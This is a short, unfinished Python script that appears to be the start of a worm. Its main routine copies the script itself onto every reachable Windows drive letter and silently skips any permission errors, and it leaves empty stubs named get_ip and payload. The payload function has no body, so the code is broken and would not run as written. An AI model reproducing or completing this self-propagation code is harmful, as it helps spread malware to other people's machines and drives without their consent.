#!/usr/bin/python3.6

import os, sys, shutil


def get_ip():
        pass

def check_disk():
        for disk_letter in "CDEFGHIJKLMNOPQRSTYVWXYZ":
                try:
                        path = disk_letter + "://"
                        if os.path.isdir(path):
                                shutil.copy(sys.argv[0], path)
                        else:
                                pass
                except PermissionError:
                        pass

def payload():


def main():
        if os.name == "nt":
                check_disk()
        elif os.name == "posix":
                pass
        else:
                pass

if __name__ == "__main__":
        main()
